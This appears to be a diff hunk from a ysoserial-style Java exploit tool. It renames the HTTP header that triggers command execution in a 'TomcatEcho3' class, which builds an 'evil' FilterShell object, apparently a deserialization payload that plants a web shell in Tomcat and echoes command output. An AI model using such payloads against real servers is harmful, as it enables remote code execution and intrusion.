@@ -11,7 +11,7 @@ import ysoserial.payloads.util.JavaCompiler;
 
 import java.io.InputStream;
 
-// tomcat rce 回显，header : Testcmd=id
+// tomcat rce 回显，header : cmd=id
 public class TomcatEcho3 {
     public static void main(final String[] args) throws Exception {
         Object evil = new FilterShell().getObject(RomeTools.class);
